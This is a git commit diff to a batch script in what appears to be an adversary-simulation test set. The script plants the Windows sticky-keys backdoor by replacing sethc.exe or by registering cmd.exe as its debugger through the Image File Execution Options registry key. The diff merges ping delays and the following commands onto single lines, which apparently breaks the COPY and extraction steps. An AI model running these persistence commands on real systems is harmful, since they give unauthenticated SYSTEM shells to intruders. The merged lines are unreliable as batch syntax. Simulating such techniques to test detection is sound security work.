283bb61ec1bafe4bda0205bb2fd1ab2c4f84ec71
NaimishP <36006376+NaimishP@users.noreply.github.com>
2020-03-25 15:13:44 -0500

    Update sticky-key-backdoor.bat
    Single line command update

--- test-sets/persistence/sticky-key-backdoor.bat
+++ test-sets/persistence/sticky-key-backdoor.bat
@@ -4,8 +4,7 @@ ECHO ===========================================================================
 ECHO SETHC BACKDOOR
 ECHO Two methods: Replacement of sethc.exe / Debugger registration
 ECHO Backing up old sethc.exe
-ping -n 5 127.0.0.1 > NUL
-COPY %SYSTEMROOT%\System32\sethc.exe %SYSTEMROOT%\System32\sethc.exe.bck
+ping -n 5 127.0.0.1 > NUL COPY %SYSTEMROOT%\System32\sethc.exe %SYSTEMROOT%\System32\sethc.exe.bck
 
 ECHO.
 ECHO Trying to replace the real sethc.exe - administrator rights needed
@@ -13,4 +12,4 @@ ECHO Instead registering cmd.exe as debugger for sethc.exe
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
 
 ECHO At least place a temporary and manipulated sethc.exe in the TEMP folder
-"%ZIP%" e -p%PASS% "%FILEARCH%" -aoa -o"%TEMP%" workfiles\sethc.exe > NUL
+ping -n 5 127.0.0.1 > NUL "%ZIP%" e -p%PASS% "%FILEARCH%" -aoa -o"%TEMP%" workfiles\sethc.exe > NUL
